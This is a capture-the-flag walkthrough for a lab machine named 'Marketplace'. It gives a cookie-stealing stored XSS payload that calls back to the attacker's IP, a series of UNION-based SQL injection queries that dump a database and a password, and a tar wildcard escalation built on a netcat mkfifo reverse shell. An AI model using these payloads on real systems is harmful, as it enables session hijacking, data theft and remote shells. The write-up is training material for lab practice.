# Marketplace

## Nmap

```
sudo nmap 10.10.68.97 -p- -sS -sV         


PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 
(Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The root page for port 80 takes us to the following page:

![](<../../../.gitbook/assets/image (900).png>)

Under the /signup directory we can create a new user.

![](<../../../.gitbook/assets/image (901).png>)

After creating the account moving over to the /login directory and then proceed to login with the user that was created.

![](<../../../.gitbook/assets/image (902).png>)

Looking at the available listings we can see that we have an opportunity to report a listing.

![](<../../../.gitbook/assets/image (903).png>)

After reporting a listing we receive a confirmation message to say that an someone will soon investigate the listing. Shortly after we receive a resppmse to say that the listing has been reviewed.

![](<../../../.gitbook/assets/image (904).png>)

This implies that staff are actively checking the listings that are reported. Knowing this we have potential for XSS.

We can then create our own listing and check to see if we can potentially use XSS. I used the \<h1> header tag for testing purposes.

![](<../../../.gitbook/assets/image (905).png>)

After submitting the query we are redirected to the new listing and can see that this has worked.

![](<../../../.gitbook/assets/image (906).png>)

With this we can set a XSS script to retrieve a cookie when someone visits the listing to send back to us. I used the following python script below:

{% embed url="https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py" %}

Edit the script to include the VPN interface IP and preferred port.

![](<../../../.gitbook/assets/image (907).png>)

Before running the script add the following code to a new listing in the description box.

```
<script>var i=new Image;i.src="http://<IP>/?"+document.cookie;</script>
```

![](<../../../.gitbook/assets/image (908).png>)

Now report the new listing and then run the script. After a short while you should receive a cookie back.

![](<../../../.gitbook/assets/image (909).png>)

We can then open the Firefox storage console and replace our current cookie with the new one whilst on the target machine webpage. If this has worked as expected we should then login as the admin account.

![](<../../../.gitbook/assets/image (910).png>)

![](<../../../.gitbook/assets/image (911).png>)

From here going to the administration panel and selecting a user shows potential for SQL injection.

![](<../../../.gitbook/assets/image (912) (1).png>)

Putting an apostrophe in the statement in place of a 1 to purposely break the statement produces a SQL error.

![](<../../../.gitbook/assets/image (913).png>)

The following commands was then used to enumerate the database.

Find how many columns exist in the table:

```
user=1 order by 4
```

Run statement in a write able column to find database names.

```
user=-1 union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -
```

Show tables from selected 'marketplace' database.

```
user=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'-- -
```

Get column names from selected table 'messages'.

```
user=-1 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='messages'-- -
```

Dump contents of select found columns inside the table.

```
user=-1 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- - 
```

Dump contents of messages table.

```
user=-1 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -
```

![](<../../../.gitbook/assets/image (914).png>)

We now have a potential password of: @b\_ENXkGYUCAv3zJ

Trying the user jake on SSH with the given password allows SSH access.

![](<../../../.gitbook/assets/image (915).png>)

Checking `sudo -l` shows we can run the /opt/backups/backup.sh file as michael without specifying a password.

![](<../../../.gitbook/assets/image (916).png>)

Running cat on backup.sh shows the following contents:

```
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

As the tar command end in a wildcard we can exploit this to gain a shell as michael. This technique is referenced here in [https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

**Conceptual Information:**

If you have ever explored tar to read its optional switches then you will find the following option.

**–checkpoint\[=NUMBER]** show progress messages every Numbers record (default 10)

**–checkpoint-action=ACTION** execute ACTION on each checkpoint

There is a ‘–checkpoint-action’ option, that will specify the program which will be executed when the checkpoint is reached. Mainly, this permits us to run an arbitrary command. Hence Options ‘–checkpoint=1’ and ‘–checkpoint-action=exec=sh shell.sh’ are handed to the ‘tar’ program as command-line options.

Created a `netcat` reverse shell with the command below.

```
msfvenom -p cmd/unix/reverse_netcat LHOST=10.14.3.108 LPORT=80 
```

![](<../../../.gitbook/assets/image (919).png>)

Run the following commands on the host machine inside the /opt/backup directory. Specifying the generated msfvenom command.

```
echo "mkfifo /tmp/zcvkti; nc 10.14.3.108 80 0</tmp/zcvkti | /bin/sh >/tmp/zcvkti 2>&1; rm /tmp/zcvkti" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
chmod 777 backup.tar
chmod 777 shell.sh
sudo -u michael /opt/backups/backup.sh
```

We should then receive a shell as michael.

![](<../../../.gitbook/assets/image (918).png>)

As michael is part of the docker group we can escalate privileges as per GTFOBins: [https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/).

![](<../../../.gitbook/assets/image (922) (1).png>)

![](<../../../.gitbook/assets/image (921) (1).png>)
